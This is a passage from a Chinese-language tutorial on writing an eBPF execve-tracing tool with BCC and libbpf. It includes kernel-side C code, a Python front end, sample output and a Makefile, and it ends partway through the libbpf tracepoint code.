function">TRACEPOINT_PROBE</span><span class="token punctuation">(</span>syscalls<span class="token punctuation">,</span> sys_exit_execve<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 从哈希映射中查询进程基本信息</span>    u32 pid <span class="token operator">=</span> <span class="token function">bpf_get_current_pid_tgid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">data_t</span> <span class="token operator">*</span>data <span class="token operator">=</span> tasks<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 填充返回值并提交到性能事件映射中</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        data<span class="token operator">-></span>retval <span class="token operator">=</span> args<span class="token operator">-></span>ret<span class="token punctuation">;</span>        events<span class="token punctuation">.</span><span class="token function">perf_submit</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">data_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 最后清理进程信息</span>        tasks<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到这里，完整的 eBPF 程序就开发好了，你可以把上述的代码保存到一个本地文件中，并命名为  <code>execsnoop.c</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Tracing execve system call. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token comment">// consts for arguments (ensure below stack size limit 512)</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ARGSIZE</span> <span class="token expression"><span class="token number">64</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TOTAL_MAX_ARGS</span> <span class="token expression"><span class="token number">5</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FULL_MAX_ARGS_ARR</span> <span class="token expression"><span class="token punctuation">(</span>TOTAL_MAX_ARGS <span class="token operator">*</span> ARGSIZE<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LAST_ARG</span> <span class="token expression"><span class="token punctuation">(</span>FULL_MAX_ARGS_ARR <span class="token operator">-</span> ARGSIZE<span class="token punctuation">)</span></span></span><span class="token comment">// perf event map (sharing data to userspace) and hash map (sharing data between tracepoints)</span><span class="token keyword">struct</span> <span class="token class-name">data_t</span> <span class="token punctuation">&#123;</span>u32 pid<span class="token punctuation">;</span><span class="token keyword">char</span> comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> retval<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> args_size<span class="token punctuation">;</span><span class="token keyword">char</span> argv<span class="token punctuation">[</span>FULL_MAX_ARGS_ARR<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">BPF_PERF_OUTPUT</span><span class="token punctuation">(</span>events<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BPF_HASH</span><span class="token punctuation">(</span>tasks<span class="token punctuation">,</span> u32<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">data_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// helper function to read string from userspace.</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">__bpf_read_arg_str</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">data_t</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token operator">-></span>args_size <span class="token operator">></span> LAST_ARG<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">bpf_probe_read_user_str</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token operator">-></span>argv<span class="token punctuation">[</span>data<span class="token operator">-></span>args_size<span class="token punctuation">]</span><span class="token punctuation">,</span> ARGSIZE<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">></span> ARGSIZE <span class="token operator">||</span> ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// increase the args size. the first tailing '\0' is not counted and hence it</span><span class="token comment">// would be overwritten by the next call.</span>data<span class="token operator">-></span>args_size <span class="token operator">+=</span> <span class="token punctuation">(</span>ret <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// sys_enter_execve tracepoint.</span><span class="token function">TRACEPOINT_PROBE</span><span class="token punctuation">(</span>syscalls<span class="token punctuation">,</span> sys_enter_execve<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// variables definitions</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>args<span class="token operator">-></span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// get the pid and comm</span><span class="token keyword">struct</span> <span class="token class-name">data_t</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>u32 pid <span class="token operator">=</span> <span class="token function">bpf_get_current_pid_tgid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>data<span class="token punctuation">.</span>pid <span class="token operator">=</span> pid<span class="token punctuation">;</span><span class="token function">bpf_get_current_comm</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">.</span>comm<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>comm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// get the binary name (first argment)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__bpf_read_arg_str</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">goto</span> out<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// get other arguments (skip first arg because it has already been read)</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">unroll</span></span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> TOTAL_MAX_ARGS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__bpf_read_arg_str</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">goto</span> out<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> out<span class="token operator">:</span><span class="token comment">// store the data in hash map</span>tasks<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// sys_exit_execve tracepoint</span><span class="token function">TRACEPOINT_PROBE</span><span class="token punctuation">(</span>syscalls<span class="token punctuation">,</span> sys_exit_execve<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// query the data from hash map</span>u32 pid <span class="token operator">=</span> <span class="token function">bpf_get_current_pid_tgid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">data_t</span> <span class="token operator">*</span>data <span class="token operator">=</span> tasks<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// submit perf events after getting the retval</span><span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>data<span class="token operator">-></span>retval <span class="token operator">=</span> args<span class="token operator">-></span>ret<span class="token punctuation">;</span>events<span class="token punctuation">.</span><span class="token function">perf_submit</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">data_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// clean up the hash map</span>tasks<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Python-前端处理"><a href="#Python-前端处理" class="headerlink" title="Python 前端处理"></a>Python 前端处理</h3><p>eBPF 程序开发完成后，最后一步就是为它增加一个 Python 前端。</p><p>同之前写的 Hello World 类似，<strong>Python 前端逻辑需要 eBPF 程序加载、挂载到内核函数和跟踪点，以及通过 BPF 映射获取和打印执行结果等几个步骤</strong>。其中，因为我们已经使用了 <code>TRACEPOINT_PROBE</code> 宏定义，来定义 eBPF 跟踪点处理函数，BCC 在加载字节码的时候，会帮你自动把它挂载到正确的跟踪点上，所以挂载的步骤就可以忽略。完整的 Python 程序如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 引入库函数</span><span class="token keyword">from</span> bcc <span class="token keyword">import</span> BPF<span class="token keyword">from</span> bcc<span class="token punctuation">.</span>utils <span class="token keyword">import</span> printb<span class="token comment"># 1) 加载eBPF代码</span>b <span class="token operator">=</span> BPF<span class="token punctuation">(</span>src_file<span class="token operator">=</span><span class="token string">"execsnoop.c"</span><span class="token punctuation">)</span><span class="token comment"># 2) 输出头</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%-6s %-16s %-3s %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">"PID"</span><span class="token punctuation">,</span> <span class="token string">"COMM"</span><span class="token punctuation">,</span> <span class="token string">"RET"</span><span class="token punctuation">,</span> <span class="token string">"ARGS"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 3) 定义性能事件打印函数</span><span class="token keyword">def</span> <span class="token function">print_event</span><span class="token punctuation">(</span>cpu<span class="token punctuation">,</span> data<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># BCC自动根据"struct data_t"生成数据结构</span>    event <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token string">"events"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>event<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    printb<span class="token punctuation">(</span><span class="token string">b"%-6d %-16s %-3d %-16s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>pid<span class="token punctuation">,</span> event<span class="token punctuation">.</span>comm<span class="token punctuation">,</span> event<span class="token punctuation">.</span>retval<span class="token punctuation">,</span> event<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 4) 绑定性能事件映射和输出函数，并从映射中循环读取数据</span>b<span class="token punctuation">[</span><span class="token string">"events"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>open_perf_buffer<span class="token punctuation">(</span>print_event<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        b<span class="token punctuation">.</span>perf_buffer_poll<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把上述的代码保存到  execsnoop.py  中，然后通过 Python 运行，并在另一个终端中执行  ls  命令，你就可以得到如下的输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> python3 execsnoop.pyPID    COMM             RET ARGS<span class="token number">1311958</span> barad_agent      <span class="token number">0</span>   /bin/sh-ccat /proc/meminfo <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">'HardwareCorrupted'</span> <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span><span class="token number">1311959</span> <span class="token function">sh</span>               <span class="token number">0</span>   cat/proc/meminfo<span class="token number">1311960</span> <span class="token function">sh</span>               <span class="token number">0</span>   grepHardwareCorrupted<span class="token number">1311961</span> <span class="token function">sh</span>               <span class="token number">0</span>   awk<span class="token punctuation">&#123;</span>print <span class="token variable">$2</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到此处，我们就开发了一个新的 eBPF 程序，它的作用也是排查短时进程相关的性能。</p><p>不过，在你想要分发这个程序到生产环境时，又会碰到一个新的难题：BCC 依赖于 LLVM 和内核头文件才可以动态编译和加载 eBPF 程序，而出于安全策略的需要，在生产环境中通常又不允许安装这些开发工具。</p><p>这个难题应该怎么克服呢？一种很容易想到的方法是把 BCC 和开发工具都安装到容器中，容器本身不提供对外服务，这样可以降低安全风险。另外一种方法就是参考内核中的 <a class="link"   href="https://elixir.bootlin.com/linux/v5.13/source/samples/bpf" >eBPF 示例<i class="fas fa-external-link-alt"></i></a>，开发一个匹配当前内核版本的 eBPF 程序，并编译为字节码，再分发到生产环境中。</p><p>除此之外，如果你的内核已经支持了 BPF 类型格式 (BTF)，我推荐你使用从内核源码中抽离出来的 libbpf 进行开发，这样可以借助 BTF 和 CO-RE 获得更好的移植性。实际上，BCC 的很多工具都在向 BTF 迁移中，相信未来 libbpf 会成为最受欢迎的 eBPF 程序开发基础库，甚至 Windows eBPF 也会支持 libbpf。</p><h2 id="libbpf-开发内核追踪程序"><a href="#libbpf-开发内核追踪程序" class="headerlink" title="libbpf 开发内核追踪程序"></a>libbpf 开发内核追踪程序</h2><h3 id="libbpf-方法"><a href="#libbpf-方法" class="headerlink" title="libbpf 方法"></a>libbpf 方法</h3><p>那么，如何用 libbpf 来开发一个 eBPF 程序呢？跟刚才的 BCC 程序类似，使用 libbpf 开发 eBPF 程序也是分为两部分：</p><ul><li>第一，内核态的 eBPF 程序；</li><li>第二，用户态的加载、挂载、映射读取以及输出程序等。</li></ul><p><strong>在 eBPF 程序中，由于内核已经支持了 BTF，你不再需要引入众多的内核头文件来获取内核数据结构的定义</strong>。取而代之的是一个通过 bpftool 生成的 <code>vmlinux.h</code>  头文件，其中包含了内核数据结构的定义。</p><p>这样，使用 libbpf 开发 eBPF 程序就可以通过以下四个步骤完成：</p><ol><li>使用 bpftool 生成内核数据结构定义头文件。BTF 开启后，你可以在系统中找到  <code>/sys/kernel/btf/vmlinux</code>  这个文件，bpftool 正是从它生成了内核数据结构头文件。</li><li>开发 eBPF 程序部分。为了方便后续通过统一的 Makefile 编译，eBPF 程序的源码文件一般命名为  <code>&lt;程序名&gt;.bpf.c</code>。</li><li>编译 eBPF 程序为字节码，然后再调用 <code>bpftool gen skeleton</code> 为 eBPF 字节码生成脚手架头文件（Skeleton Header）。这个头文件包含了 eBPF 字节码以及相关的加载、挂载和卸载函数，可在用户态程序中直接调用。</li><li>最后就是用户态程序引入上一步生成的头文件，开发用户态程序，包括 eBPF 程序加载、挂载到内核函数和跟踪点，以及通过 BPF 映射获取和打印执行结果等。</li></ol><p>通常，这几个步骤里面的编译、库链接、执行 <code>bpftool</code>  命令等，都可以放到 Makefile 中，这样就可以通过一个 <code>make</code> 命令去执行所有的步骤。比如，下面是一个简化版本的 Makefile：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">APPS <span class="token operator">=</span> execsnoop<span class="token punctuation">.</span>PHONY<span class="token operator">:</span> allall<span class="token operator">:</span> $<span class="token punctuation">(</span>APPS<span class="token punctuation">)</span>$<span class="token punctuation">(</span>APPS<span class="token punctuation">)</span><span class="token operator">:</span>    clang <span class="token operator">-</span>g <span class="token operator">-</span>O2 <span class="token operator">-</span>target bpf <span class="token operator">-</span>D__TARGET_ARCH_x86_64 <span class="token operator">-</span>I<span class="token operator">/</span>usr<span class="token operator">/</span>include<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu <span class="token operator">-</span>I<span class="token punctuation">.</span> <span class="token operator">-</span>c $@<span class="token punctuation">.</span>bpf<span class="token punctuation">.</span>c <span class="token operator">-</span>o $@<span class="token punctuation">.</span>bpf<span class="token punctuation">.</span>o    bpftool gen skeleton $@<span class="token punctuation">.</span>bpf<span class="token punctuation">.</span>o <span class="token operator">></span> $@<span class="token punctuation">.</span>skel<span class="token punctuation">.</span>h    clang <span class="token operator">-</span>g <span class="token operator">-</span>O2 <span class="token operator">-</span>Wall <span class="token operator">-</span>I <span class="token punctuation">.</span> <span class="token operator">-</span>c $@<span class="token punctuation">.</span>c <span class="token operator">-</span>o $@<span class="token punctuation">.</span>o    clang <span class="token operator">-</span>Wall <span class="token operator">-</span>O2 <span class="token operator">-</span>g $@<span class="token punctuation">.</span>o <span class="token operator">-</span><span class="token keyword">static</span> <span class="token operator">-</span>lbpf <span class="token operator">-</span>lelf <span class="token operator">-</span>lz <span class="token operator">-</span>o $@vmlinux<span class="token operator">:</span>    $<span class="token punctuation">(</span>bpftool<span class="token punctuation">)</span> btf dump file <span class="token operator">/</span>sys<span class="token operator">/</span>kernel<span class="token operator">/</span>btf<span class="token operator">/</span>vmlinux format c <span class="token operator">></span> vmlinux<span class="token punctuation">.</span>h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有了这个 Makefile 之后，你执行 <code>make vmlinux</code> 命令就可以生成 <code>vmlinux.h</code> 文件，再执行 <code>make</code> 就可以编译  <code>APPS</code> 里面配置的所有 eBPF 程序（多个程序之间以空格分隔）。</p><h3 id="内核头文件生成"><a href="#内核头文件生成" class="headerlink" title="内核头文件生成"></a>内核头文件生成</h3><p>首先，对于第一步，我们只需要执行下面的命令，即可生成内核数据结构的头文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> bpftool btf dump <span class="token function">file</span> /sys/kernel/btf/vmlinux <span class="token function">format</span> c <span class="token operator">></span> vmlinux.h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果命令执行失败了，并且错误说 BTF 不存在，那说明当前系统内核没有开启 BTF 特性。这时候，你需要开启 <code>CONFIG_DEBUG_INFO_BTF=y</code> 和 <code>CONFIG_DEBUG_INFO=y</code> 这两个编译选项，然后重新编译和安装内核。</p><h3 id="eBPF-程序定义"><a href="#eBPF-程序定义" class="headerlink" title="eBPF 程序定义"></a>eBPF 程序定义</h3><p>第二步就是开发 eBPF 程序，包括定义哈希映射、性能事件映射以及跟踪点的处理函数等，而对这些数据结构和跟踪函数的定义都可以通过 <code>SEC()</code> 宏定义来完成。在编译时，<strong>通过 <code>SEC()</code> 宏定义的数据结构和函数会放到特定的 ELF 段中，这样后续在加载 BPF 字节码时，就可以从这些段中获取所需的元数据</strong>。</p><p>比如，你可以使用下面的代码来定义映射和跟踪点处理函数：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 包含头文件</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"vmlinux.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bpf/bpf_helpers.h></span></span><span class="token comment">// 定义进程基本信息数据结构</span><span class="token keyword">struct</span> <span class="token class-name">event</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>    <span class="token keyword">int</span> retval<span class="token punctuation">;</span>    <span class="token keyword">int</span> args_count<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> args_size<span class="token punctuation">;</span>    <span class="token keyword">char</span> args<span class="token punctuation">[</span>FULL_MAX_ARGS_ARR<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 定义哈希映射</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token function">__uint</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> BPF_MAP_TYPE_HASH<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__uint</span><span class="token punctuation">(</span>max_entries<span class="token punctuation">,</span> <span class="token number">10240</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__type</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token class-name">pid_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__type</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">event</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> execs <span class="token function">SEC</span><span class="token punctuation">(</span><span class="token string">".maps"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 定义性能事件映射</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token function">__uint</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> BPF_MAP_TYPE_PERF_EVENT_ARRAY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__uint</span><span class="token punctuation">(</span>key_size<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>u32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__uint</span><span class="token punctuation">(</span>value_size<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>u32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> events <span class="token function">SEC</span><span class="token punctuation">(</span><span class="token string">".maps"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// sys_enter_execve跟踪点</span><span class="token function">SEC</span><span class="token punctuation">(</span><span class="token string">"tracepoint/syscalls/sys_enter_execve"</span><span class="token punctuation">)</span><span class="token keyword">int</span> <span class="token function">tracepoint__syscalls__sys_enter_execve</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">trace_event_raw_sys_enter</span> <span class="token operator">*</span>ctx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 待实现处理逻辑</span><span class="token punctuation">&#125;</span><span class="token comment">// sys_exit_execve跟踪点</span><span class="token function">SEC</span><span class="token punctuation">(</span><span class="token string">"tracepoint/syscalls/sys_exit_execve"</span><span class="token punctuation">)</span><span class="token keyword">int</span> <span class="token function">tracepoint__syscalls__sys_exit_execve</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">trace_event_raw_sys_exit</span> <span class="token operator">*</span>ctx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 待实现处理逻辑</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义许可证（前述的BCC默认使用GPL）</span><span class="token keyword">char</span> LICENSE<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">SEC</span><span class="token punctuation">(</span><span class="token string">"license"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"Dual BSD/GPL"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>让我们来看看这段代码的具体含义：</p><ul><li>头文件 <code>vmlinux.h</code> 包含了内核数据结构，而 <code>bpf/bpf_helpers.h</code> 包含了之前提到的 BPF 辅助函数；</li><li><code>struct event</code> 定义了进程基本信息数据结构，它会用在后面的哈希映射中；</li><li><code>SEC(&quot;.maps&quot;)</code> 定义了哈希映射和性能事件映射；</li><li><code>SEC(&quot;tracepoint/&lt;跟踪点名称&gt;&quot;)</code> 定义了跟踪点处理函数，系统调用跟踪点的格式是  <code>tracepoint/syscalls/&lt;系统调用名称&gt;&quot;</code>。以后你需要定义内核插桩和用户插桩的时候，也是以类似的格式定义，比如 <code>kprobe/do_unlinkat</code>  或  <code>uprobe/func</code>；</li><li>最后的  <code>SEC(&quot;license&quot;)</code>  定义了 eBPF 程序的许可证。在上述的 BCC eBPF 程序中，我们并没有定义许可证，这是因为 BCC 自动帮你使用了 GPL 许可。</li></ul><p>有了基本的程序结构，接下来就是<strong>实现系统调用入口和出口跟踪点的处理函数</strong>。它们的基本过程跟上述的 BCC 程序是类似的。</p><h3 id="入口跟踪点处理-1"><a href="#入口跟踪点处理-1" class="headerlink" title="入口跟踪点处理"></a>入口跟踪点处理</h3><p>对于入口跟踪点 <code>sys_enter_execve</code> 的处理，还是按照上述 BCC 程序的逻辑，先获取进程的 PID、进程名称和参数列表之后，再存入刚刚定义的哈希映射中。完整代码如下所示，具体每一步的内容我都加了详细的注释：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">SEC</span><span class="token punctuation">(</span><span class="token string">"tracepoint/syscalls/sys_enter_execve"</span><span class="token punctuation">)</span><span class="token keyword">int</span> <span class="token function">tracepoint__syscalls__sys_enter_execve</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token 